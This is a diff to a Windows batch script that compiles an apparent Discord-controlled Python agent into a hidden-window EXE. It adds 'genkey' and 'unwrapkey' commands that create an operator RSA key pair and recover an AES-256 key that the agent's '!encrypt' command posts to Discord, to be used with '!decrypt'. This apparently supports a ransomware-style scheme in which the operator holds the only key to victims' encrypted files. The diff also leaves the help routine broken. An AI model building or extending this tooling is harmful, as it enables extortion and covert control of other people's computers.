@@ -77,6 +77,12 @@ if /I "%~1"=="dry-run" set "DRY_RUN=1" & shift & goto parse_args
 if /I "%~1"=="--dry-run" set "DRY_RUN=1" & shift & goto parse_args
 if /I "%~1"=="bootstrap" set "BOOTSTRAP=1" & shift & goto parse_args
 if /I "%~1"=="--bootstrap" set "BOOTSTRAP=1" & shift & goto parse_args
+if /I "%~1"=="setup" set "DO_SETUP=1" & shift & goto parse_args
+if /I "%~1"=="--setup" set "DO_SETUP=1" & shift & goto parse_args
+if /I "%~1"=="genkey" set "DO_GENKEY=1" & shift & goto parse_args
+if /I "%~1"=="--genkey" set "DO_GENKEY=1" & shift & goto parse_args
+if /I "%~1"=="unwrapkey" goto parse_unwrapkey
+if /I "%~1"=="--unwrapkey" goto parse_unwrapkey
 if /I "%~1"=="list-icons" set "LIST_ICONS=1" & shift & goto parse_args
 if /I "%~1"=="--list-icons" set "LIST_ICONS=1" & shift & goto parse_args
 if /I "%~1"=="icon" goto parse_icon
@@ -229,8 +235,30 @@ set "SIGN_SCRIPT_COMMAND=%~1"
 shift
 goto parse_args
 
+:parse_unwrapkey
+shift
+if "%~1"=="" (
+  echo [ERROR] Missing .b64 file after unwrapkey.
+  echo Usage: build.bat unwrapkey ^<wrapped.b64^> [op_private.pem]
+  echo   Paste the base64 blob from Discord into a plain text file, then pass the filename.
+  goto show_help_error
+)
+set "WRAP_B64_FILE=%~1"
+set "DO_UNWRAPKEY=1"
+shift
+if not "%~1"=="" (
+  set "UNWRAP_PRIVKEY=%~1"
+  shift
+) else (
+  set "UNWRAP_PRIVKEY=op_private.pem"
+)
+goto parse_args
+
 :args_done
 if defined LIST_ICONS goto list_icons
+if defined DO_SETUP goto do_setup
+if defined DO_GENKEY goto do_genkey
+if defined DO_UNWRAPKEY goto do_unwrapkey
 
 if defined OUTPUT_DIR_OVERRIDE set "DIST_DIR=%OUTPUT_DIR_OVERRIDE%"
 
@@ -411,6 +439,100 @@ if errorlevel 1 (
 )
 
 exit /b 0
+
+:do_unwrapkey
+echo [INFO] Unwrapping AES key using RSA private key...
+where openssl >nul 2>&1
+if errorlevel 1 (
+  echo [ERROR] openssl not found. Add C:\Program Files\Git\usr\bin to PATH or install OpenSSL.
+  goto fail
+)
+if not exist "%UNWRAP_PRIVKEY%" (
+  echo [ERROR] Private key not found: "%UNWRAP_PRIVKEY%"
+  goto fail
+)
+if not exist "%WRAP_B64_FILE%" (
+  echo [ERROR] Base64 file not found: "%WRAP_B64_FILE%"
+  echo Create a plain text file with the base64 blob from Discord and pass its path.
+  goto fail
+)
+set "TMPBIN=%TEMP%\art_wrapped_%RANDOM%.bin"
+set "TMPKEY=%TEMP%\art_key_%RANDOM%.bin"
+REM Decode base64 file to binary (Python handles any line wrapping)
+py -3.13 -c "import os,base64; raw=open(os.environ['WRAP_B64_FILE']).read().strip(); open(os.environ['TMPBIN'],'wb').write(base64.b64decode(raw))"
+if errorlevel 1 (
+  del /f /q "%TMPBIN%" "%TMPKEY%" 2>nul
+  echo [ERROR] Failed to base64-decode the file. Make sure it contains only the blob ^(no extra text^).
+  goto fail
+)
+openssl pkeyutl -decrypt -inkey "%UNWRAP_PRIVKEY%" -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in "%TMPBIN%" -out "%TMPKEY%" 2>nul
+if errorlevel 1 (
+  del /f /q "%TMPBIN%" "%TMPKEY%" 2>nul
+  echo [ERROR] RSA decryption failed. Wrong private key, or the blob is corrupt/truncated.
+  goto fail
+)
+echo.
+echo [INFO] Decrypting with: %UNWRAP_PRIVKEY%
+echo [INFO] AES-256 master key (hex) -- pass this to: !decrypt ^<path^> ^<key_hex^>
+echo.
+py -3.13 -c "import os,binascii; data=open(os.environ['TMPKEY'],'rb').read(); print(binascii.hexlify(data).decode()) if len(data)==32 else print('[ERROR] Key is',len(data),'bytes -- expected 32. Wrong key?')"
+del /f /q "%TMPBIN%" "%TMPKEY%" 2>nul
+goto success
+
+:do_genkey
+
+where openssl >nul 2>&1
+if errorlevel 1 (
+  echo [ERROR] openssl not found. Install it from https://slproweb.com/products/Win32OpenSSL.html or via Git for Windows.
+  goto fail
+)
+if exist "op_private.pem" (
+  echo [WARN] op_private.pem already exists. Delete it first if you want to regenerate.
+  goto fail
+)
+openssl genrsa -out op_private.pem 4096
+if errorlevel 1 (
+  echo [ERROR] RSA key generation failed.
+  goto fail
+)
+openssl rsa -in op_private.pem -pubout -out op_public.pem
+if errorlevel 1 (
+  echo [ERROR] Public key export failed.
+  goto fail
+)
+echo.
+echo [OK] Key pair generated:
+echo   Private key : op_private.pem  ^(keep this OFFLINE and SECURE^)
+echo   Public key  : op_public.pem   ^(paste contents into OPERATOR_RSA_PUBLIC_KEY in agent_template.py^)
+echo.
+echo [WARN] NEVER commit op_private.pem to version control.
+goto success
+
+:do_setup
+echo [INFO] Creating Python 3.13 virtual environment in "build_env"...
+if exist "build_env" (
+  echo [INFO] "build_env" already exists, skipping venv creation.
+) else (
+  py -3.13 -m venv build_env
+  if errorlevel 1 (
+    echo [ERROR] Failed to create virtual environment. Ensure Python 3.13 is installed and available via the py launcher.
+    goto fail
+  )
+  echo [INFO] Virtual environment created.
+)
+set "VENV_PYTHON=build_env\Scripts\python.exe"
+set "PYTHON_EXE=%VENV_PYTHON%"
+set "PYTHON_LABEL=%VENV_PYTHON%"
+echo [INFO] Installing dependencies from "%REQUIREMENTS_FILE%"...
+call :install_build_deps
+if errorlevel 1 goto fail
+echo [INFO] Setup complete. Run build.bat to compile the EXE.
+echo.
+echo   To activate the virtual environment in your current shell:
+echo     PowerShell:      .\build_env\Scripts\Activate.ps1
+echo     Command Prompt:  build_env\Scripts\activate.bat
+echo.
+goto success
 
 :list_icons
 if not exist "%ICONS_DIR%" (
@@ -747,45 +869,26 @@ echo [INFO] Release archive ready: "%ARCHIVE_FILE%"
 exit /b 0
 
 :show_help
-echo Usage: build.bat [clean] [dry-run] [bootstrap] [--icon file.ico] [--name output-name] [--python 3.13^|path\python.exe] [--console^|--windowed] [--debug] [--log-level level] [--smoke-test] [--version x.y.z.w] [--company name] [--product name] [--manifest asInvoker^|highest^|admin] [--requirements file.txt] [--output-dir path] [--archive] [--sign-script "command"] [--list-icons] [pause]
+echo Usage: build.bat [clean] [dry-run] [bootstrap] [genkey] [--icon file.ico] [--name output-name] [--python 3.13^|path\python.exe] [--console^|--windowed] [--debug] [--log-level level] [--smoke-test] [--version x.y.z.w] [--company name] [--product name] [--manifest asInvoker^|highest^|admin] [--requirements file.txt] [--output-dir path] [--archive] [--sign-script "command"] [--list-icons] [pause]
 echo.
 echo   clean          Remove the existing build directory before compiling.
 echo   dry-run        Print the resolved PyInstaller command without building.
 echo   bootstrap      Install dependencies from the selected requirements file.
-echo   --icon         Use an .ico file from the icons folder for the EXE icon.
-echo   --name         Override the EXE filename. Defaults to the selected icon name.
-echo   --python       Use a specific python.exe path or a py launcher version like 3.13.
-echo   --console      Build a console-visible executable for debugging.
-echo   --windowed     Build without a console window. This is the default.
-echo   --debug        Shortcut for --log-level DEBUG.
-echo   --log-level    Pass a PyInstaller log level such as INFO, WARN, or DEBUG.
-echo   --smoke-test   Print output size and generate a SHA256 checksum after build.
-echo   --version      Set the Windows file/product version metadata.
-echo   --company      Set CompanyName in the EXE version metadata.
-echo   --product      Set ProductName and FileDescription in the EXE version metadata.
-echo   --manifest     Set the requested execution level: asInvoker, highest, or admin.
-echo   --requirements Use an alternate requirements file during bootstrap.
-echo   --output-dir   Place the built EXE in a different directory.
-echo   --archive      Create a release zip with the EXE, checksum, and release notes if present.
-echo   --sign-script  Run a post-build command and append the EXE path as the final argument.
-echo   --list-icons   Show available .ico files in the icons folder.
-echo   pause          Pause before exit.
-goto success
+echo   genkey         Generate a fresh RSA-4096 operator key pair (op_private.pem + op_public.pem).
+echo   unwrapkey      Unwrap the base64 AES key from !encrypt using your private key.
+echo                  Save the Discord blob to a .b64 file, then: build.bat unwrapkey wrapped.b64 [op_private.pem]
 
 :show_help_error
-echo Usage: build.bat [clean] [dry-run] [bootstrap] [--icon file.ico] [--name output-name] [--python 3.13^|path\python.exe] [--console^|--windowed] [--debug] [--log-level level] [--smoke-test] [--version x.y.z.w] [--company name] [--product name] [--manifest asInvoker^|highest^|admin] [--requirements file.txt] [--output-dir path] [--archive] [--sign-script "command"] [--list-icons] [pause]
+echo Usage: build.bat [setup] [clean] [dry-run] [bootstrap] [genkey] [--icon file.ico] [--name output-name] [--python 3.13^|path\python.exe] [--console^|--windowed] [--debug] [--log-level level] [--smoke-test] [--version x.y.z.w] [--company name] [--product name] [--manifest asInvoker^|highest^|admin] [--requirements file.txt] [--output-dir path] [--archive] [--sign-script "command"] [--list-icons] [pause]
 echo.
+echo   setup          Create build_env venv (first time) and install all dependencies. Does not build.
 echo   clean          Remove the existing build directory before compiling.
 echo   dry-run        Print the resolved PyInstaller command without building.
-echo   bootstrap      Install dependencies from the selected requirements file.
+echo   bootstrap      Install dependencies from the selected requirements file (venv must already exist).
+echo   genkey         Generate a fresh RSA-4096 operator key pair (op_private.pem + op_public.pem).
+echo   unwrapkey      Unwrap the base64 AES key from !encrypt using your private key.
+echo                  Save the Discord blob to a .b64 file, then: build.bat unwrapkey wrapped.b64 [op_private.pem]
 echo   --icon         Use an .ico file from the icons folder for the EXE icon.
-echo   --name         Override the EXE filename. Defaults to the selected icon name.
-echo   --python       Use a specific python.exe path or a py launcher version like 3.13.
-echo   --console      Build a console-visible executable for debugging.
-echo   --windowed     Build without a console window. This is the default.
-echo   --debug        Shortcut for --log-level DEBUG.
-echo   --log-level    Pass a PyInstaller log level such as INFO, WARN, or DEBUG.
-echo   --smoke-test   Print output size and generate a SHA256 checksum after build.
 echo   --version      Set the Windows file/product version metadata.
 echo   --company      Set CompanyName in the EXE version metadata.
 echo   --product      Set ProductName and FileDescription in the EXE version metadata.
